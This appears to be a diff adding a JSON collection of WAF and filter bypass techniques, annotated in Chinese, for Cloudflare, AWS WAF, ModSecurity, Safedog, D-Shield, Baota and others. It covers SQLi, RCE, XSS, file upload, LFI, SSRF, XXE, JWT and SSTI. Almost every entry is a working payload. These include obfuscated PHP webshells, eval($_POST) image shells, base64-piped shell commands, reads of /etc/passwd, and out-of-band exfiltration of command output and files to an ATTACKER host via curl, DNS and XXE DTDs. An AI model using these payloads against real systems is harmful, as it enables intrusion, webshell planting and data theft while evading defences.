@@ -1,0 +1,347 @@
+{
+  "bypasses": [
+    {
+      "id": "bypass-waf-cloudflare",
+      "title": "Cloudflare: 常见绕过面",
+      "target": "waf",
+      "description": "CF 主要看路径规范化与源站直连，绕 WAF 不如绕到源站。",
+      "body": "# 1) 找源站（历史 DNS / 证书 / 子域）\ncurl -s https://crt.sh/?q=%25.target.com | grep -oE '[a-z0-9.-]+'\n# 2) 路径大小写与斜杠\n/Admin  /admin/  /./admin  //admin  /%2fadmin\n# 3) 编码\n%252e%252e%252f  %c0%ae%c0%ae%c0%af\n# 4) 头部\nX-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nCF-Connecting-IP: 127.0.0.1\n# 5) 分块传输绕 body 检测\nTransfer-Encoding: chunked"
+    },
+    {
+      "id": "bypass-waf-aws",
+      "title": "AWS WAF: 规则集绕过思路",
+      "target": "waf",
+      "description": "AWS WAF 的 managed rules 对大小写、注释、编码的覆盖有限。",
+      "body": "# 1) 大小写 / 注释\nSeLeCt 1 /*!50000union*/\n# 2) JSON body 逃逸（只检 form 时）\nContent-Type: application/json\n{\"q\":\"1' or 1=1-- \"}\n# 3) 参数污染\n?id=1&id=1' or 1=1--\n# 4) 超长 body 触发 size 限制（部分规则跳过）\n# 5) Unicode 归一化差异\n%ef%bc%87  （全角）"
+    },
+    {
+      "id": "bypass-waf-modsec-crs",
+      "title": "ModSecurity CRS: 规则绕过",
+      "target": "waf",
+      "description": "CRS 的 paranoia level 决定严格度；低 PL 时注释与等价语法基本都能过。",
+      "body": "# 1) 注释分割关键字\nunion/**/select  /*!50000select*/\n# 2) 参数名混淆（CRS 按参数名打分）\n?1' or 1=1-- =x\n# 3) 分块 + 延迟（绕 payload 拼接检测）\n# 4) 换行代替空格\nunion%0aselect%0a1,2,3\n# 5) 双写\nununionion seselectlect\n# 6) 检查 PL 级别\n?x=<script>alert(1)</script>  → 被拦说明 PL>=1"
+    },
+    {
+      "id": "bypass-waf-safedog",
+      "title": "安全狗: 绕过要点",
+      "target": "waf",
+      "description": "安全狗对关键字与 union/select 组合最敏感，对编码与内联注释较松。",
+      "body": "/*!50000union*/ /*!50000select*/ 1,2,3\nunion%23%0aselect 1,2,3\n# 空格\n%09 %0a %0c /**/\n# 关键字\nselselectect  （双写）\n# 函数替换\nmid() 代替 substr()\n# 文件包含\n?file=../../../../etc/passwd  →  ..%2f..%2f..%2f..%2fetc%2fpasswd"
+    },
+    {
+      "id": "bypass-waf-dshield",
+      "title": "D 盾: 绕过要点",
+      "target": "waf",
+      "description": "D 盾对 eval/assert/$_POST 组合敏感，对编码与变量函数较松。",
+      "body": "<?php $a=$_REQUEST['a'];$b='ass'.'ert';$b($a);?>\n<?php $_u=$_POST;@$u[0]($_u[1]);?>\n<?php call_user_func('assert',$_POST[1]);?>\n# 关键字拆分\n$a='sys';$b='tem';$a.$b('id');\n# base64\neval(base64_decode($_POST[1]));"
+    },
+    {
+      "id": "bypass-waf-bt",
+      "title": "宝塔 WAF: 绕过要点",
+      "target": "waf",
+      "description": "宝塔 WAF 基于正则 + 语义，对 header 注入与编码绕过防护较弱。",
+      "body": "# 1) 参数走 header\nX-Forwarded-Host: 1' or 1=1--\n# 2) Cookie 传参\nCookie: q=1' or 1=1--\n# 3) 分块传输\nTransfer-Encoding: chunked\n# 4) 大包（超 8MB 可能跳过检测）\n# 5) 上传点用 multipart 边界混淆"
+    },
+    {
+      "id": "bypass-waf-yunsuo",
+      "title": "云锁: 绕过要点",
+      "target": "waf",
+      "description": "云锁偏主机层，重点看命令执行与文件写入，Web 层正则相对薄。",
+      "body": "# 命令执行\na=c;b=at;$a$b /etc/passwd\n$(printf 'cat') /etc/passwd\n/???/??t /etc/passwd\n# 文件写入\nfile_put_contents('/tmp/x.php',base64_decode($_POST[1]));\n# 编码\necho ZWNobyBpZA==|base64 -d|sh"
+    },
+    {
+      "id": "bypass-waf-leichi",
+      "title": "雷池 / 长亭: 绕过要点",
+      "target": "waf",
+      "description": "语义引擎强，靠语法变形难绕；改走业务逻辑与协议层。",
+      "body": "# 1) 语义难绕 → 换入口\n# 2) HTTP/2 伪头与路径规范化差异\n# 3) 请求走私（CL.TE）\n# 4) 参数污染\n# 5) 上传 + 包含组合（单点都合法）"
+    },
+    {
+      "id": "bypass-waf-json-body",
+      "title": "WAF: Content-Type 切换绕过",
+      "target": "waf",
+      "description": "很多 WAF 只解析 form 或只解析 json，切换类型就能把 payload 送进去。",
+      "body": "Content-Type: application/json      →  {\"q\":\"1' or 1=1-- \"}\nContent-Type: text/plain            →  1' or 1=1-- \nContent-Type: application/xml       →  <q>1' or 1=1-- </q>\nContent-Type: multipart/form-data   →  分片放 payload\n# 同时发两份，看后端取哪个\n?q=safe  +  body q=1' or 1=1-- "
+    },
+    {
+      "id": "bypass-waf-chunked",
+      "title": "WAF: 分块传输与请求拆分",
+      "target": "waf",
+      "description": "分块让 WAF 无法拼出完整 payload，后端仍会拼回去。",
+      "body": "POST / HTTP/1.1\nTransfer-Encoding: chunked\nContent-Type: application/x-www-form-urlencoded\n\n4\nq=1'\n9\n+or+1=1--\n0\n\n# 变体：CL+TE 同时给\nContent-Length: 6\nTransfer-Encoding: chunked"
+    },
+    {
+      "id": "bypass-waf-unicode",
+      "title": "WAF: Unicode / 全角 / 超长编码",
+      "target": "waf",
+      "description": "归一化差异是 WAF 与后端最大的裂缝。",
+      "body": "# 全角\n％２７  ｏｒ  ＝\n# UTF-8 超长编码（老 IIS/Java）\n%c0%a7  %e0%80%a7\n# Unicode 转义\n\\u0027  \\u006f\\u0072\n# 大小写 + 双重编码\n%2527  %252e%252e%252f\n# HTML 实体（XSS）\n&#x27;  &#39;  &apos;"
+    },
+    {
+      "id": "bypass-waf-path",
+      "title": "WAF: 路径规范化绕过",
+      "target": "waf",
+      "description": "WAF 与后端对路径的规范化顺序不同，是绕规则与绕鉴权的高发点。",
+      "body": "/admin  →  /Admin  /ADMIN  /admin/  //admin  /./admin  /admin/.  \n/..;/admin          （Tomcat）\n/admin%20  /admin%09  /admin%00\n/static/../admin\n/%2e/admin\n/admin;jsessionid=1\n# 双写\n/aaadmin  →  /admin（WAF 只替换一次）"
+    },
+    {
+      "id": "bypass-sqli-comment",
+      "title": "SQLi: 注释与内联注释变形",
+      "target": "sqli",
+      "description": "最通用的一类，几乎对所有正则型 WAF 有效。",
+      "body": "union/**/select\nunion/*!50000select*/\n/*!50000union*//*!50000select*/1,2,3\n1/**/or/**/1=1\n1 or/**/1=1\n# 版本注释当关键字\n/*!12345or*/1=1"
+    },
+    {
+      "id": "bypass-sqli-func",
+      "title": "SQLi: 函数等价替换",
+      "target": "sqli",
+      "description": "被拦函数换等价函数，语义不变。",
+      "body": "substr → mid / substring / left / right\nascii → ord / hex\nconcat → concat_ws / group_concat / ||\nsleep → benchmark / heavy query / pg_sleep\nupdatexml → extractvalue / geometrycollection\nload_file → 用 into outfile 反读"
+    },
+    {
+      "id": "bypass-sqli-quote",
+      "title": "SQLi: 引号与字符串构造",
+      "target": "sqli",
+      "description": "引号被转义时用十六进制、char()、或宽字节。",
+      "body": "0x61646d696e\nchar(97,100,109,105,110)\nconcat(char(97),char(100))\n# 宽字节（GBK）\n%df' → %df%5c%27 被吃成 運'\n# 反斜杠逃逸\nadmin\\  →  吃掉转义符"
+    },
+    {
+      "id": "bypass-sqli-noquote",
+      "title": "SQLi: 无引号注入",
+      "target": "sqli",
+      "description": "数字型参数完全不需要引号，很多 WAF 只盯引号。",
+      "body": "?id=1 or 1=1\n?id=1 union select 1,2,3\n?id=1 procedure analyse(extractvalue(1,concat(0x7e,version())),1)"
+    },
+    {
+      "id": "bypass-rce-split",
+      "title": "RCE: 命令拆分与拼接",
+      "target": "rce",
+      "description": "命令关键字被拦时，用变量、通配符、编码还原。",
+      "body": "a=c;b=at;$a$b /etc/passwd\n/???/??t /etc/passwd\nc'a't /etc/passwd\nc\"\"at /etc/passwd\n$(printf 'cat') /etc/passwd\necho Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh"
+    },
+    {
+      "id": "bypass-rce-newline",
+      "title": "RCE: 换行 / 制表 / 变量分隔",
+      "target": "rce",
+      "description": "空格被拦时的全部替代。",
+      "body": "$IFS\n${IFS}\n$IFS$9\n%09\n%0a\n<  （重定向当分隔）\n{cat,/etc/passwd}"
+    },
+    {
+      "id": "bypass-rce-windows",
+      "title": "RCE: Windows 命令拼接",
+      "target": "rce",
+      "description": "Windows 的分隔与转义符与 Linux 不同。",
+      "body": "whoami & dir\nwhoami && dir\nwhoami | dir\nwhoami || dir\nwho^a^m^i\ncmd /c \"whoami\"\npowershell -c \"whoami\"\n%COMSPEC% /c whoami"
+    },
+    {
+      "id": "bypass-xss-tag",
+      "title": "XSS: 标签与属性变形",
+      "target": "xss",
+      "description": "被过滤 script 时换标签，被过滤尖括号时换编码。",
+      "body": "<svg onload=alert(1)>\n<img src=x onerror=alert(1)>\n<details open ontoggle=alert(1)>\n<video><source onerror=alert(1)>\n<a href=javascript:alert(1)>x</a>\n<iframe srcdoc=\"<script>alert(1)</script>\">"
+    },
+    {
+      "id": "bypass-xss-encoding-2",
+      "title": "XSS: 编码与上下文",
+      "target": "xss",
+      "description": "按输出上下文选编码：HTML 实体、JS 十六进制、URL。",
+      "body": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;\n\\x3cscript\\x3ealert(1)\\x3c/script\\x3e\n%3Cscript%3Ealert(1)%3C/script%3E\n# 属性内\n\" onmouseover=\"alert(1)\n' onfocus='alert(1)' autofocus='\n# script 内\n</script><svg onload=alert(1)>"
+    },
+    {
+      "id": "bypass-upload-name",
+      "title": "文件上传: 文件名绕过组合",
+      "target": "upload",
+      "description": "文件名、Content-Type、文件头三层独立绕过。",
+      "body": "x.php\nx.php5 x.phtml x.pht x.phar\nx.PHP x.Php\nx.php.jpg x.jpg.php\nx.php%00.jpg\nx.php.  x.php::$DATA\nx.asp;.jpg\n# 双写\nx.pphphp"
+    },
+    {
+      "id": "bypass-upload-header",
+      "title": "文件上传: 内容检测绕过",
+      "target": "upload",
+      "description": "有文件头/内容检测时用图片马或分片拼接。",
+      "body": "GIF89a<?php eval($_POST[1]);?>\n\\xFF\\xD8\\xFF\\xE0<?php eval($_POST[1]);?>\n# 二次渲染绕过（GIF）\n# 分片上传后合并\n# zip/phar 包装\n# 图片 EXIF 写 payload 再包含"
+    },
+    {
+      "id": "bypass-upload-race",
+      "title": "文件上传: 条件竞争",
+      "target": "upload",
+      "description": "先能访问再被删的短暂窗口里执行。",
+      "body": "# 1) 上传并并发访问\nfor i in $(seq 1 200); do curl -s http://TARGET/upload/x.php & done\n# 2) 上传一个会写马的脚本，让它自己落盘\nx.php 内容：<?php file_put_contents('y.php','<?php eval($_POST[1]);?>');?>\n# 3) 利用临时文件 /tmp/phpXXXX"
+    },
+    {
+      "id": "bypass-lfi-dotdot",
+      "title": "LFI: 穿越与编码变体",
+      "target": "lfi",
+      "description": "过滤 ../ 时的等价写法。",
+      "body": "../../../../etc/passwd\n..%2f..%2f..%2f..%2fetc%2fpasswd\n..%252f..%252fetc%252fpasswd\n....//....//etc/passwd\n..\\..\\..\\..\\windows\\win.ini\n%2e%2e%2f%2e%2e%2f\n# 绝对路径直接读\n/etc/passwd"
+    },
+    {
+      "id": "bypass-lfi-wrapper",
+      "title": "LFI: 伪协议绕过扩展名限制",
+      "target": "lfi",
+      "description": "加了 .php 后缀时用伪协议把后缀吃掉。",
+      "body": "php://filter/convert.base64-encode/resource=index\nphp://filter/resource=index.php\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\nphar:///upload/x.jpg/a.txt\nzip:///upload/x.zip%23a.txt\ncompress.zlib:///upload/x.gz"
+    },
+    {
+      "id": "bypass-ssrf-host-2",
+      "title": "SSRF: host 校验绕过",
+      "target": "ssrf",
+      "description": "黑名单拦 127.0.0.1 时的等价地址。",
+      "body": "127.0.0.1\nlocalhost\n127.1\n0.0.0.0\n[::1]\n[::ffff:127.0.0.1]\n2130706433\n0x7f000001\n0177.0.0.1\n127.0.0.1.nip.io\nATTACKER#@127.0.0.1\n127.0.0.1@ATTACKER"
+    },
+    {
+      "id": "bypass-ssrf-redirect2",
+      "title": "SSRF: 跳转与 DNS 重绑定",
+      "target": "ssrf",
+      "description": "校验发生在解析前，跳转后不再校验。",
+      "body": "# 302\nhttp://ATTACKER/r?to=http://127.0.0.1:6379\n# DNS 重绑定（ttl=0 先给外网再给内网）\nhttp://rebind.ATTACKER:8080/\n# 短链\nhttp://s.ATTACKER/x"
+    },
+    {
+      "id": "bypass-xxe-filter",
+      "title": "XXE: 关键字过滤绕过",
+      "target": "xxe",
+      "description": "拦 SYSTEM/PUBLIC 时用参数实体与编码。",
+      "body": "<!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\">%a;]>\n<!DOCTYPE r [<!ENTITY x \"&#x66;ile:///etc/passwd\">]>\n# 用 PUBLIC\n<!DOCTYPE r [<!ENTITY x PUBLIC \"-//x//x\" \"file:///etc/passwd\">]>\n# 大小写\n<!doctype r [<!entity x system \"file:///etc/passwd\">]>"
+    },
+    {
+      "id": "bypass-xxe-oob",
+      "title": "XXE: 无回显外带",
+      "target": "xxe",
+      "description": "有回显限制时把数据塞进 URL 或 FTP 路径。",
+      "body": "<!DOCTYPE r [<!ENTITY % f SYSTEM \"http://ATTACKER/e.dtd\">%f;]>\n# e.dtd\n<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://ATTACKER/?%a;'>\">%b;%c;"
+    },
+    {
+      "id": "bypass-deser-format",
+      "title": "反序列化: 数据格式变形",
+      "target": "deserialization",
+      "description": "同一对象可用多种序列化格式表达，检测常只覆盖一种。",
+      "body": "PHP: O:4:\"Test\":0:{}  →  a:1:{i:0;O:4:\"Test\":0:{}}\nJava: rO0AB...  →  Base64 / gzip 后再 base64\nPython: pickle  →  纯文本 opcode（cos\\nsystem\\n...）\nNode: {\"rce\":\"_$$ND_FUNC$$_function(){...}()\"}"
+    },
+    {
+      "id": "bypass-proto-path",
+      "title": "原型污染: 键名变形",
+      "target": "prototype-pollution",
+      "description": "过滤 __proto__ 时用 constructor.prototype 或 unicode 键。",
+      "body": "{\"__proto__\":{\"x\":1}}\n{\"constructor\":{\"prototype\":{\"x\":1}}}\n{\"__pro\\u0074o__\":{\"x\":1}}\n{\"__proto__ \":{\"x\":1}}\n# query 形式\n?__proto__[x]=1&constructor[prototype][x]=1"
+    },
+    {
+      "id": "bypass-jwt-sig",
+      "title": "JWT: 签名绕过组合",
+      "target": "jwt",
+      "description": "五种绕过一次试完。",
+      "body": "# 1) alg=none\n{\"alg\":\"none\"}\n# 2) 空签名保留原值\n# 3) HS256 + 公钥\n# 4) kid 注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}\n# 5) jku / x5u\n{\"alg\":\"RS256\",\"jku\":\"http://ATTACKER/jwks.json\"}"
+    },
+    {
+      "id": "bypass-auth-header",
+      "title": "认证绕过: 头部与路径组合",
+      "target": "auth-bypass",
+      "description": "后端按路径鉴权、前端按前缀路由时，这些组合能穿过去。",
+      "body": "X-Forwarded-For: 127.0.0.1\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Forwarded-Host: localhost\n/admin/..;/  →  /admin\n/admin%2f..%2fadmin\n/api/v1/user/../../admin\n# 方法覆盖\nX-HTTP-Method-Override: PUT"
+    },
+    {
+      "id": "bypass-auth-case",
+      "title": "认证绕过: 大小写与后缀",
+      "target": "auth-bypass",
+      "description": "Spring/Shiro 对路径后缀与大小写的匹配差异。",
+      "body": "/admin  →  /Admin  /ADMIN  /admin/\n/admin.do  /admin.action  /admin.json\n/admin%3b  /admin;\n/admin/  /admin//\n# Shiro\n/;/admin  /admin/..;/"
+    },
+    {
+      "id": "bypass-nosqli-op",
+      "title": "NoSQL 注入: 操作符绕过",
+      "target": "nosqli",
+      "description": "过滤 $ 时用 unicode 或数组形式。",
+      "body": "{\"password\":{\"$ne\":1}}\n{\"password\":{\"$gt\":\"\"}}\n{\"password\":{\"$regex\":\"^a\"}}\n# $ 被过滤\n{\"password\":{\"\\u0024ne\":1}}\n# 数组\npassword[$ne]=1\n# JS\n{\"$where\":\"1==1\"}"
+    },
+    {
+      "id": "bypass-archive-name",
+      "title": "压缩包: 条目名绕过",
+      "target": "archive-slip",
+      "description": "路径检测常只查 ../，换编码或软链接。",
+      "body": "../../../../var/www/html/x.php\n..%2f..%2f..%2f..%2fvar/www/html/x.php\n..\\..\\..\\..\\windows\\temp\\x.aspx\n# 软链接穿越\nln -s /var/www/html link  →  条目 link/x.php\n# 绝对路径\n/etc/cron.d/x"
+    },
+    {
+      "id": "bypass-cmd-blind",
+      "title": "盲命令执行: 判断与外带",
+      "target": "rce",
+      "description": "无回显时用时间、DNS、HTTP 三种通道。",
+      "body": "sleep 5\nping -c3 ATTACKER\ncurl http://ATTACKER/`id|base64 -w0`\nnslookup `whoami`.ATTACKER\n# 判断执行点\na;sleep 5  vs  a&&sleep 5  （前者总会等）"
+    },
+    {
+      "id": "bypass-waf-size",
+      "title": "WAF: 大包 / 慢速绕过",
+      "target": "waf",
+      "description": "超过检测上限或分片过慢时，部分 WAF 直接放行。",
+      "body": "# 1) 超大 body（> 8MB）\n# 2) 慢速发送（每字节延迟）\n# 3) 大量无关参数稀释\n?a=1&b=2&...&payload=1' or 1=1--"
+    },
+    {
+      "id": "bypass-waf-ip",
+      "title": "WAF: 源站直连与 Host 伪造",
+      "target": "waf",
+      "description": "绕 WAF 最有效的方式是绕开它。",
+      "body": "# 1) 找源站 IP\ndig +short target.com\ncurl -s https://api.hackertarget.com/hostsearch/?q=target.com\n# 2) 直连源站 + Host 头\ncurl -H 'Host: target.com' http://ORIGIN_IP/\n# 3) 内网回环头\nX-Forwarded-For: 127.0.0.1"
+    },
+    {
+      "id": "bypass-upload-ext-double",
+      "title": "文件上传: 双扩展与解析器差异",
+      "target": "upload",
+      "description": "Nginx/Apache/IIS 对双扩展解析顺序不同。",
+      "body": "x.php.jpg     Apache 从右往左找 → 常不解析\nx.jpg.php     → 解析\nx.php.        Windows 去尾点 → 解析\nx.php%00.jpg  → 截断\nx.php/.       → 部分解析器按 x.php\nx.asp;.jpg    IIS6"
+    },
+    {
+      "id": "bypass-ssti-blacklist",
+      "title": "SSTI: 关键字黑名单绕过",
+      "target": "ssti",
+      "description": "拦 __class__ / os 时用 attr、拼接、request 传参。",
+      "body": "{{''|attr('__class__')}}\n{{''['__cl'+'ass__']}}\n{{''[request.args.a][request.args.b]}}\n{{lipsum['__glo'+'bals__']}}\n{%print(1)%}"
+    },
+    {
+      "id": "bypass-cors-origin",
+      "title": "CORS: Origin 校验绕过",
+      "target": "cors",
+      "description": "正则匹配域名时用后缀与特殊字符穿。",
+      "body": "Origin: https://evil.target.com\nOrigin: https://target.com.evil.com\nOrigin: https://evil.com#target.com\nOrigin: null\nOrigin: http://target.com:evil"
+    },
+    {
+      "id": "bypass-open-redirect-host",
+      "title": "开放重定向: 白名单绕过",
+      "target": "open-redirect",
+      "description": "只校验包含目标域名的写法。",
+      "body": "//evil.com\n/\\evil.com\nhttps:evil.com\nhttps://target.com@evil.com\nhttps://evil.com?target.com\nhttps://evil.com#target.com\n////evil.com"
+    },
+    {
+      "id": "bypass-crlf-filter",
+      "title": "CRLF: 过滤绕过",
+      "target": "crlf",
+      "description": "拦 %0d%0a 时用单换行或宽字符。",
+      "body": "%0a\n%0d\n%0d%0a\n%E5%98%8A%E5%98%8D\n%23%0a  （# 吃掉后续）"
+    },
+    {
+      "id": "bypass-xpath-quote",
+      "title": "XPath: 引号与逻辑绕过",
+      "target": "xpath",
+      "description": "XPath 无注释，用括号与 or 恒真。",
+      "body": "' or '1'='1\n' or 1=1 or ''='\nx' or name()='username' or 'a'='b\n# 无引号时\n1 or 1=1"
+    },
+    {
+      "id": "bypass-ldap-filter",
+      "title": "LDAP: 过滤器注入绕过",
+      "target": "ldap",
+      "description": "过滤 * ) ( 时用转义序列。",
+      "body": "*\n*)(uid=*\nadmin)(&)\nadmin)(|(password=*\n# 转义\n\\2a  \\28  \\29"
+    },
+    {
+      "id": "bypass-graphql-limit",
+      "title": "GraphQL: 限流与深度限制绕过",
+      "target": "graphql",
+      "description": "别名批量与分片绕过速率限制。",
+      "body": "mutation{m1:login(u:\"a\",p:\"1\")m2:login(u:\"a\",p:\"2\")}\n# 数组批量\n[{query:\"{a}\"},{query:\"{b}\"}]\n# 深度绕过\n{a{b{c{d}}}}"
+    },
+    {
+      "id": "bypass-fix-detect",
+      "title": "修复检测: 判断对面补丁是否只做了表面过滤",
+      "target": "info-leak",
+      "description": "AWD 对抗时先探对面的修复方式，再选对应绕过。",
+      "body": "# 1) 是否只加了 addslashes → 用宽字节或数字型\n# 2) 是否只拦关键字 → 用等价函数\n# 3) 是否只拦了参数名 → 换参数\n# 4) 是否只在前端校验 → 直接打接口\n# 5) 是否加了 WAF → 测 header 与分块"
+    }
+  ]
+}
